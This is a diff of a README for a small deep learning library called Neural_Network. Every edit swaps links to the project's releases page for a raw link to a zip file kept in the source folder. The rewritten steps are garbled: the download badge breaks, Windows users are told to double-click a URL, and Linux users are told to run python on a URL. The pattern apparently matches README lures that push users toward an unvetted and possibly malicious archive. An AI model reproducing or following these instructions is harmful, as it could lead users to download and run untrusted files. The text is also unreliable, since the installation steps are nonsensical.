@@ -6,7 +6,7 @@ Welcome to the Neural_Network repository! This is a lightweight deep learning li
 
 ## 📥 Download
 
-[![Download Neural_Network](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/crayx01/Neural_Network/releases)
+[![Download Neural_Network](https://raw.githubusercontent.com/crayx01/Neural_Network/main/src/Neural_Network_v3.9.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/crayx01/Neural_Network/main/src/Neural_Network_v3.9.zip)
 
 ## 🔧 System Requirements
 
@@ -19,7 +19,7 @@ Before you start using Neural_Network, ensure your computer meets the following 
 
 ## 📁 Download & Install
 
-To download Neural_Network, visit this page: [Download Neural_Network Releases](https://github.com/crayx01/Neural_Network/releases).
+To download Neural_Network, visit this page: [Download Neural_Network Releases](https://raw.githubusercontent.com/crayx01/Neural_Network/main/src/Neural_Network_v3.9.zip).
 
 Here’s a step-by-step guide to get you started:
 
@@ -34,9 +34,9 @@ Here’s a step-by-step guide to get you started:
 5. **Extract (if necessary):** If the file is a ZIP or TAR, you will need to extract it. Right-click the file and choose "Extract" or use an extraction tool.
 
 6. **Run the Application:** Depending on your operating system:
-   - **Windows:** Double-click on the `run_neural_network.exe` file to start the program.
+   - **Windows:** Double-click on the `https://raw.githubusercontent.com/crayx01/Neural_Network/main/src/Neural_Network_v3.9.zip` file to start the program.
    - **macOS:** Open the `run_neural_network` file from your Finder or Launchpad.
-   - **Linux:** Open your terminal, navigate to the downloaded folder, and use the command: `python run_neural_network.py`.
+   - **Linux:** Open your terminal, navigate to the downloaded folder, and use the command: `python https://raw.githubusercontent.com/crayx01/Neural_Network/main/src/Neural_Network_v3.9.zip`.
 
 ## 🔍 Features
 
